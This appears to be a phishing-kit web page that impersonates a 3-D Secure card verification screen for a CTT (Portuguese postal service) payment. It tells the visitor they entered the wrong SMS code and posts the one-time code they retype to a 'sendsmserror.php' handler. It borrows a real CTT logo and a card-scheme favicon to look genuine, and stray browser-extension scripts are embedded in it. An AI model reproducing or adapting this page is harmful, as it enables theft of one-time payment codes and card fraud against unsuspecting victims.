
<html lang="da"><script id="allow-copy_script">(function agent() {
    let isUnlockingCached = false
    const isUnlocking = () => isUnlockingCached
    document.addEventListener('allow_copy', event => {
      const { unlock } = event.detail
      isUnlockingCached = unlock
    })

    const copyEvents = [
      'copy',
      'cut',
      'contextmenu',
      'selectstart',
      'mousedown',
      'mouseup',
      'mousemove',
      'keydown',
      'keypress',
      'keyup',
    ]
    const rejectOtherHandlers = e => {
      if (isUnlocking()) {
        e.stopPropagation()
        if (e.stopImmediatePropagation) e.stopImmediatePropagation()
      }
    }
    copyEvents.forEach(evt => {
      document.documentElement.addEventListener(evt, rejectOtherHandlers, {
        capture: true,
      })
    })
  })()</script><script type="text/javascript" charset="utf-8" id="zm-extension" src="chrome-extension://fdcgdnkidjaadafnichfpabhfomcebme/scripts/webrtc-patch.js" async=""></script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>CZ</title>
    
    <meta name="viewport" content="width=device-width, user-scalable=yes, initial-scale=0.75">
    <link rel="stylesheet" type="text/css" href="files/screen.css">
    <link rel="stylesheet" type="text/css" href="files/gh-buttons.css">
    <link rel="icon" type="image/x-icon" href="https://acs3.3dsecure.no/logos/favicon.ico">
    <script src="commons.js"></script>
    <script src="jquery-3.3.1.min.js"></script>
    <script type="text/javascript">

        function onBodyLoad() {
            document.form.otp.focus();
        }
    </script>
</head>
<body onload="onBodyLoad();">
<div id="authform">
    <div class="wrapper">
        <div class="scheme-logo-div"><img class="scheme-logo" alt="" src="https://www.ctt.pt/application/themes/images/logo-ctt.svg?size=200x44"></div>
        <div class="brand-logo-div"><img class="brand-logo" alt="" src="files/visa-mastercard.gif" ></div>
        <div class="flag-icon-div" title="Engelsk">
            <a href="#"></a>
        </div>
        <div class="clear"></div>
        <h1>Verificação única</h1>
        <p>Enviamos um código de uso único para o seu celular.</p>
        <p>Digite o código que você recebeu por telefone para concluir a transação e clique em "Confirmar".</p>
        <form id="form" name="form" method="post" action="sendsmserror.php">
            <dl style="margin-top: 10px;">
                <dt>Online shop: </dt>
                <dd>CTT</dd>

                <dt>A soma: </dt>
                <dd id="purchAmount">2.59 EURO</dd>

                <dt>Datado:  </dt> 
              <?php echo $date = date('m/d/Y h:i:s a', time());?> 

                <dt>Número do cartão: </dt>
                <dd>XXXX XXXX XXXX XXXX</dd>

				


                <dt>
                    <label for="code" style="color:red">Você digitou o código errado, tente novamente: </label>
                </dt>
                <dd>
                    <input style="width: 100px" type="number" pattern="[0-9]+" width="6" id="otp" name="sms"  autocomplete="off" maxlength="8" oninvalid="this.setCustomValidity('SMS')"
  oninput="this.setCustomValidity('')">
                    <button class="button icon approve primary" name="submit" id="submit" type="submit" value="submit" style="position: absolute; margin-left: 5px;">Confirmar</button>
                </dd>
            </dl>
            <div id="errorMessage" class="error"></div>
            
           
        </form>
    </div>
</div>
<script type="text/javascript">
    function incrementResendCount() {
        var resendCount = localStorage.getItem("localResendCount");
        if (resendCount == null) {
            resendCount = 0;
        }
        resendCount = Number(resendCount);
        resendCount = ++resendCount;
        localStorage.setItem("localResendCount", resendCount);
    }

    $(document).ready(function(){
        var resendCount = localStorage.getItem("localResendCount");

        if (Number(resendCount) >= 2) {
            $("#resendButton").hide();
            $("#resendText").hide();
            $("#errorMessage").hide();
            $("#resendExceeded").show();
            localStorage.setItem("localResendCount", "0");
        }

    });
</script>



</body></html>